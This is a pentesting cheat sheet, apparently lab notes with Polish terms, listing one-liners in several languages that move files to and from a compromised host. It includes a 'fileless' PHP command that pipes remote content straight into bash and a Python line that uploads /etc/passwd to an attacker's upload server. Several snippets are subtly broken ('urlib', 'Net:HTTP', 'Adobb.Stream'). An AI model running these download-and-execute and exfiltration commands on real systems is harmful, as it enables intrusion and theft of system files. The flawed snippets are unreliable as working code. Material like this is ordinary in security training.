# Transferring Files with Code


##  Python

### Download:

```bash
# Python 2
python2.7 -c 'import urlib;urlib.urlretrieve("URL", "plik")'

# Python 3
python3 -c 'import urllib.request;urllib.request.urlretrieve("URL", "plik")'
```

##  PHP

### Download:

```bash
# file_get_contents()
php -r '$file = file_get_contents("URL"); file_put_contents("plik",$file);'

# fopen() - z buforem
php -r 'const BUFFER = 1024; $fremote = fopen("URL", "rb"); $flocal = fopen("plik", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'

# Fileless (wykonaj od razu)
php -r '$lines = @file("URL"); foreach ($lines as $line) { echo $line; }' | bash
```

##  Ruby

### Download:

```bash
ruby -e 'require "net/http"; File.write("plik", Net:HTTP.get(URI.parse("URL")))'
```

##  Perl

### Download:

```bash
perl -e 'use LWP::Simple; getstore("URL", "plik");'
```


##  JavaScript (Windows)

### File `wget.js`:

```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

### Run:

```cmd
cscript.exe /nologo wget.js URL plik
```


##  VBScript (Windows)

### File `wget.vbs`:

```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adobb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send
with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

### Run:

```cmd
cscript.exe /nologo wget.vbs URL plik
```


##  Upload with Python3

### Server (Pwnbox):

```bash
python3 -m uploadserver
```

### Upload (mashyni):

```bash
python3 -c 'import requests;requests.post("http://IP:8000/upload",files={"files":open("/etc/passwd","rb")})'
```
# Download
scp user@IP:/ścieżka/plik .

# Upload
scp plik user@IP:/ścieżka/
